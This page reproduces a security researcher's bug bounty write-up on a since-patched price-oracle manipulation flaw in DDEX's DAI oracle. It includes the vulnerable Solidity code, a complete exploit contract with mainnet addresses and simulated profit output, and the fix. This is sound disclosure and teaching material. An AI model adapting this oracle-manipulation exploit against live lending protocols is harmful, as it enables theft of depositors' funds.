# DDEX (Bug Bounty)

{% hint style="warning" %}
The following content was copied from [samczun's bug bounty report](https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/) on a bug on DDEX that he discovered and was patched consequently, this was not an actual exploit.
{% endhint %}

DDEX is a decentralized exchange platform but are in the process of expanding into decentralized lending so that they can offer their users the ability to create leveraged long and short positions. They're currently beta testing their decentralized margin exchange.

On September 9th 2019, DDEX added DAI as an asset to their margin trading platform and enabled the ETH/DAI market. For the oracle, they specified [this](https://etherscan.io/address/0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8) smart contract which returns the value of DAI/USD by calculating `PriceOfETHInUSD/PriceOfETHInDAI`. The value of ETH/USD is read from the Maker oracle, while the value of ETH/DAI is read from either Eth2Dai, or if the spread is too great, Uniswap.

```javascript
function peek()
	public
	view
	returns (uint256 _price)
{
	uint256 makerDaoPrice = getMakerDaoPrice();

	if (makerDaoPrice == 0) {
		return _price;
	}

	uint256 eth2daiPrice = getEth2DaiPrice();

	if (eth2daiPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(eth2daiPrice);
		return _price;
	}

	uint256 uniswapPrice = getUniswapPrice();

	if (uniswapPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(uniswapPrice);
		return _price;
	}

	return _price;
}

function getEth2DaiPrice()
	public
	view
	returns (uint256)
{
	if (Eth2Dai.isClosed() || !Eth2Dai.buyEnabled() || !Eth2Dai.matchingEnabled()) {
		return 0;
	}

	uint256 bidDai = Eth2Dai.getBuyAmount(address(DAI), WETH, eth2daiETHAmount);
	uint256 askDai = Eth2Dai.getPayAmount(address(DAI), WETH, eth2daiETHAmount);

	uint256 bidPrice = bidDai.mul(ONE).div(eth2daiETHAmount);
	uint256 askPrice = askDai.mul(ONE).div(eth2daiETHAmount);

	uint256 spread = askPrice.mul(ONE).div(bidPrice).sub(ONE);

	if (spread > eth2daiMaxSpread) {
		return 0;
	} else {
		return bidPrice.add(askPrice).div(2);
	}
}

function getUniswapPrice()
	public
	view
	returns (uint256)
{
	uint256 ethAmount = UNISWAP.balance;
	uint256 daiAmount = DAI.balanceOf(UNISWAP);
	uint256 uniswapPrice = daiAmount.mul(10**18).div(ethAmount);

	if (ethAmount < uniswapMinETHAmount) {
		return 0;
	} else {
		return uniswapPrice;
	}
}

function getMakerDaoPrice()
	public
	view
	returns (uint256)
{
	(bytes32 value, bool has) = makerDaoOracle.peek();

	if (has) {
		return uint256(value);
	} else {
		return 0;
	}
}
```

[Source](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L89-L155)

In order to trigger an update and cause the oracle to refresh its stored value, a user simply has to call `updatePrice()`.

```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price != 0) {
		price = _price;
		emit UpdatePrice(price);
		return true;
	} else {
		return false;
	}
}
```

[Source](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L74-L87)

### The attack

Let's assume we can manipulate the apparent value of DAI/USD. If this is the case, we would like to use this to borrow all of the ETH in the system while providing as little DAI as possible. To achieve this, we can either lower the apparent value of ETH/USD or increase the apparent value of DAI/USD. Since we're already assuming that the apparent value of DAI/USD is manipulable, we'll choose the latter.

To increase the apparent value DAI/USD, we can either increase the apparent value of ETH/USD, or decrease the apparent value of ETH/DAI. For all intents and purposes manipulating Maker's oracle is impossible, so we'll try decreasing the apparent value of ETH/DAI.

The oracle will calculate the value of ETH/DAI as reported by Eth2Dai by taking the average of the current asking price and the current bidding price. In order to decrease this value, we'll need to lower the current bidding price by filling existing orders and then lower the current asking price by placing new orders.

However, this requires a significant initial investment (as we need to fill orders then make an equivalent number of orders) and is non-trivial to implement. On the other hand, we can drop the Uniswap price simply by selling a large amount of DAI to Uniswap. As such, we'll aim to bypass the Eth2Dai logic and manipulate the Uniswap price.

In order to bypass Eth2Dai, we need to manipulate the magnitude of the spread. We can do this in one of two ways:

1. Clear out one side of the orderbook while leaving the other alone. This causes spread to increase positively
2. Force a crossed orderbook by listing an extreme buy or sell order. This causes spread to decrease negatively.

While option 2 would result in no losses from taking unfavorable orders, the use of SafeMath disallows a crossed orderbook and as such is unavailable to us. Instead, we'll force a large positive spread by clearing out one side of the orderbook. This will cause the DAI oracle to fallback to Uniswap to determine the price of DAI. Then, we can cause the Uniswap price of DAI/ETH to drop by buying a large amount of DAI. Once the apparent value of DAI/USD has been manipulated, it's trivial to take out a loan like as usual.

#### Demo <a href="#demo" id="demo"></a>

The following script will turn a profit of approximately 70 ETH by:

1. Clearing out Eth2Dai's sell orders until the spread is large enough that the oracle rejects the price
2. Buying more DAI from Uniswap, dropping the price from 213DAI/ETH to 13DAI/ETH
3. Borrowing all the available ETH (\~120) for a small amount of DAI (\~2500)
4. Selling the DAI we bought from Uniswap back to Uniswap
5. Selling the DAI we bought from Eth2Dai back to Eth2Dai
6. Resetting the oracle (don't want anyone else abusing our favorable rates)

```javascript
contract DDEXExploit is Script, Constants, TokenHelper {
    OracleLike private constant ETH_ORACLE = OracleLike(0x8984F1CFf1d614a7404b0cfE97C6fa9110b93Bd2);
    DaiOracleLike private constant DAI_ORACLE = DaiOracleLike(0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8);
    
    ERC20Like private constant HYDRO_ETH = ERC20Like(0x000000000000000000000000000000000000000E);
    HydroLike private constant HYDRO = HydroLike(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);
    
    uint16 private constant ETHDAI_MARKET_ID = 1;
    
    uint private constant INITIAL_BALANCE = 25000 ether;
    
    function setup() public {
        name("ddex-exploit");
        blockNumber(8572000);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.skewRates)
            .then(this.checkRates)
            .then(this.steal)
            .then(this.cleanup)
            .then(this.checkProfits);
    }
    
    function checkRates() external {
        uint ethPrice = ETH_ORACLE.getPrice(HYDRO_ETH);
        uint daiPrice = DAI_ORACLE.getPrice(DAI);
        
        printf("eth=%.18u dai=%.18u\n", abi.encode(ethPrice, daiPrice));
    }
    
    uint private boughtFromMatchingMarket = 0;
    
    function skewRates() external {
        skewUniswapPrice();
        skewMatchingMarket();
        require(DAI_ORACLE.updatePrice());
    }
    
    function skewUniswapPrice() internal {
        DAI.getFromUniswap(DAI.balanceOf(address(DAI.getUniswapExchange())) * 75 / 100);
    }
    
    function skewMatchingMarket() internal {
        uint start = DAI.balanceOf(address(this));
        WETH.deposit.value(address(this).balance)();
        WETH.approve(address(MATCHING_MARKET), uint(-1));
        while (DAI_ORACLE.getEth2DaiPrice() != 0) {
            MATCHING_MARKET.buyAllAmount(DAI, 5000 ether, WETH, uint(-1));
        }
        boughtFromMatchingMarket = DAI.balanceOf(address(this)) - start;
        WETH.withdrawAll();
    }
    
    function steal() external {
        HydroLike.Market memory ethDaiMarket = HYDRO.getMarket(ETHDAI_MARKET_ID);
        HydroLike.BalancePath memory commonPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.Common,
            marketID: 0,
            user: address(this)
        });
        HydroLike.BalancePath memory ethDaiPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.CollateralAccount,
            marketID: 1,
            user: address(this)
        });
        
        uint ethWanted = HYDRO.getPoolCashableAmount(HYDRO_ETH);
        uint daiRequired = ETH_ORACLE.getPrice(HYDRO_ETH) * ethWanted * ethDaiMarket.withdrawRate / DAI_ORACLE.getPrice(DAI) / 1 ether + 1 ether;
        
        printf("ethWanted=%.18u daiNeeded=%.18u\n", abi.encode(ethWanted, daiRequired));
        
        HydroLike.Action[] memory actions = new HydroLike.Action[](5);
        actions[0] = HydroLike.Action({
            actionType: HydroLike.ActionType.Deposit,
            encodedParams: abi.encode(address(DAI), uint(daiRequired))
        });
        actions[1] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(DAI), commonPath, ethDaiPath, uint(daiRequired))
        });
        actions[2] = HydroLike.Action({
            actionType: HydroLike.ActionType.Borrow,
            encodedParams: abi.encode(uint16(ETHDAI_MARKET_ID), address(HYDRO_ETH), uint(ethWanted))
        });
        actions[3] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(HYDRO_ETH), ethDaiPath, commonPath, uint(ethWanted))
        });
        actions[4] = HydroLike.Action({
            actionType: HydroLike.ActionType.Withdraw,
            encodedParams: abi.encode(address(HYDRO_ETH), uint(ethWanted))
        });
        DAI.approve(address(HYDRO), daiRequired);
        HYDRO.batch(actions);
    }
    
    function cleanup() external {
        DAI.approve(address(MATCHING_MARKET), uint(-1));
        MATCHING_MARKET.sellAllAmount(DAI, boughtFromMatchingMarket, WETH, uint(0));
        WETH.withdrawAll();
        
        DAI.giveAllToUniswap();
        require(DAI_ORACLE.updatePrice());
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
}

/*
### running script "ddex-exploit" at block 8572000
#### executing step: exploit
##### calling: checkRates()
eth=213.440000000000000000 dai=1.003140638067989051
##### calling: skewRates()
##### calling: checkRates()
eth=213.440000000000000000 dai=16.058419875880325580
##### calling: steal()
ethWanted=122.103009983203364425 daiNeeded=2435.392672403537525078
##### calling: cleanup()
##### calling: checkProfits()
profits=72.140629996890984407
#### finished executing step: exploit
*/
```

#### Solution <a href="#solution" id="solution"></a>

The DDEX team fixed this by deploying a [new oracle](https://etherscan.io/address/0xe6f148448b61339a59ef6ab9ab7378e9200fa745) which places sanity bounds on the price of DAI, currently set to `0.95` and `1.05`.

```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price == 0) {
		return false;
	}

	if (_price == price) {
		return true;
	}

	if (_price > maxPrice) {
		_price = maxPrice;
	} else if (_price < minPrice) {
		_price = minPrice;
	}

	price = _price;
	emit UpdatePrice(price);

	return true;
}
```

## Resources

* [https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/](https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/)
